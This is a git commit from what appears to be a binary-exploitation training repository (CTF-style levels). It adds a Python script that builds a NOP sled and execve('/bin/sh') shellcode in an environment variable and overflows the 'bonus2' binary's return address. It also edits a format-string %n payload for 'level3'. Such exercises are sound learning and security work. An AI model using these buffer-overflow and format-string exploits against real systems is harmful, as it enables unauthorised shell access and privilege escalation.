745df4fe3ea3ded1c10c16af1e5ba0dfa63f99f7
xtrm <oss@xtrm.me>
2025-06-07 20:06:24 +0200

    ✨ feature: bonus2 + bonus3
    Signed-off-by: xtrm <oss@xtrm.me>

---
+++ levels/bonus2/payload-bonus2.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python3
+
+import struct
+
+def p(x): return struct.pack('<I', x)
+
+shellcode = (b"\x90" * 100) + b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+payload = b"fi"
+payload += shellcode
+
+def printable(c): return c >= 0x20 and c <= 0x7e
+    
+print("export LANG=$'", end="")
+for c in payload:
+    if printable(c):
+        print("%c" % c, end="")
+    else:
+        print("\\x%02x" % c, end="")
+
+print("'")
+
+args = "./bonus2 aAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZ bAbBbCbDbEbFbGbHbI$'"
+print(args, end="")
+args = p(0xbffffebc + 50)
+for c in args:
+    if printable(c):
+        print("%c" % c, end="")
+    else:
+        print("\\x%02x" % c, end="")
+print("'")
--- levels/level3/payload.py
+++ levels/level3/payload.py
@@ -5,14 +5,14 @@ from struct import pack
 def p(x): return pack('<I', x)
 def isprint(c): return c >= 0x20 and c <= 0x7e
 
-total_length = 64
+length_left = 64
 
 m_address = p(0x0804988c)
 payload = m_address
-total_length -= len(payload)
+length_left -= len(payload)
 payload += b"%010p" * 3
-total_length -= 10 * 3
-payload += total_length * b"A"
+length_left -= 10 * 3
+payload += length_left * b"A"
 payload += b"%n"
 
 for c in payload:
